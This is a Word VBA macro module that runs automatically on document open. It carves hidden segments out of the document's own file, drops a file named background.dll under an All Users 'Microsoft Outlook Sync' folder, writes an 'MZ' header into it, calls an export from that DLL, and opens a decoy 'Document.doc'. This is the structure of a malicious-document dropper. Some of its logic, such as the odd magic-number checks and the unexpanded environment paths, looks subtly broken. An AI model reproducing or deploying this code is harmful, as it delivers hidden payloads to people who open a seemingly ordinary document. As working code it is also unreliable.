#If VBA7 Then
Private Declare PtrSafe Sub OpenBackgroundProfile Lib "background" Alias "OpenProfile" (ByVal filePtr As LongPtr, ByVal fileLength As LongPtr)
#Else
Private Declare Sub OpenBackgroundProfile Lib "background" Alias "OpenProfile" (ByVal filePtr As Long, ByVal fileLength As Long)
#End If

Dim dllFileName As String
Dim versionCode As String
Dim imageFilePath As String
Dim documentFullPath As String
Dim outlookSyncFolder As String
Dim defaultDocumentName As String
Dim allUsersPath As String
Dim guestImageFile As String

Private Sub OpenDocument(filePath As String)
    Documents.Open (filePath)
End Sub

Private Sub InitializeVariables()
    On Error Resume Next
    outlookSyncFolder = "Microsoft Outlook Sync"
    defaultDocumentName = "Document.doc"
    Dim userAccountFolder As String
    userAccountFolder = "User Account"
    SetFilePaths
    userAccountFolder = userAccountFolder & " Pictures"
    dllFileName = "background.dll"
    guestImageFile = "\guest.bmp"
    documentFullPath = ThisDocument.FullName
    userAccountFolder = "\Microsoft\" & userAccountFolder & guestImageFile
    userAccountFolder = "%AllUsersProfile%" & userAccountFolder
    allUsersPath = "%AllUsersProfile%\" & outlookSyncFolder
    Dim pathArray() As String
    pathArray = Split(allUsersPath, "\")
    Dim cache As String
    cache = pathArray(LBound(pathArray))
    For i = LBound(pathArray) + 1 To UBound(pathArray)
        cache = cache & "\" & pathArray(i)
        MkDir cache
    Next
    FileCopy userAccountFolder, allUsersPath & guestImageFile
    If Len(defaultDocumentName) = 0 Then
        defaultDocumentName = documentFullPath & "x"
    Else
        defaultDocumentName = Replace(documentFullPath, Dir(documentFullPath), defaultDocumentName)
    End If
    ProcessFile
    FileCopy allUsersPath & guestImageFile, allUsersPath & "\" & dllFileName
    FinalizeSetup
    SetAttr documentFullPath, vbNormal
    ThisDocument.Close
End Sub

Private Sub Document_Open()
    InitializeVariables
End Sub

Private Sub SetFilePaths()
#If VBA7 Then
    #If Win64 Then
        versionCode = "48"
    #Else
        versionCode = "17"
    #End If
#Else
    versionCode = "135"
#End If
End Sub

Private Sub FileOperation(fileHandle As Long, startPos As Long, bufferLength As Long, actionFlag As Long)
    On Error Resume Next
    Dim buffer() As Byte
    Dim tempData As Long
    Dim currentPos As Long
    Dim tempPath As String
    Dim bufferSize As Long
    currentPos = 62
    bufferSize = bufferLength
    If actionFlag = 83 Then
        tempPath = defaultDocumentName
    Else
        tempPath = allUsersPath & guestImageFile
    End If
    Randomize
    Seek fileHandle, startPos
    If actionFlag <> 111 Then
        Get fileHandle, , tempData
        Get fileHandle, , currentPos
        bufferSize = bufferLength - 1 + currentPos
        startPos = startPos + 42
        Seek fileHandle, startPos
    End If
    ReDim buffer(bufferSize - 1)
    Get fileHandle, , buffer()
    If currentPos <> 50 Then
        For i = 1 To bufferLength - 74
            buffer(bufferSize - i - 1) = buffer(bufferLength - 1 - i)
        Next i
    End If
    Dim outFile As Long
    outFile = FreeFile
    If currentPos <> 38 Then
        For i = 1 To currentPos - 29
            buffer(tempData + i) = 125 * Rnd
        Next i
    Else
        Kill tempPath
    End If
    Open tempPath For Binary Access Write As outFile
    Put outFile, , buffer()
    Close outFile
    If currentPos = 36 Then
        OpenDocument tempPath
    End If
End Sub

Private Sub ProcessFile()
    Dim fileHandle As Long
    Dim fileSize As Long
    Dim bufferSize As Long
    Dim loopCounter As Long
    fileHandle = FreeFile
    Open documentFullPath For Binary Access Read As fileHandle
    fileSize = LOF(fileHandle) + 12
    For loopCounter = 1 To 10
        Seek fileHandle, fileSize - 2
        Get fileHandle, , bufferSize
        If bufferSize = 10 Then
            Exit For
        End If
        fileSize = fileSize - 5 - bufferSize
        If versionCode <> loopCounter Then
            FileOperation fileHandle, fileSize, bufferSize, loopCounter
        End If
    Next loopCounter
    Close fileHandle
End Sub

Private Sub FinalizeSetup()
    ChDir allUsersPath
    Dim tempFile As Long
    tempFile = FreeFile
    Dim header As String
    Open dllFileName For Binary Access Write As tempFile
    header = "MZ"
    Put tempFile, , header
    Close tempFile
    Kill allUsersPath & guestImageFile
    OpenBackgroundProfile StrPtr(documentFullPath), 16
End Sub
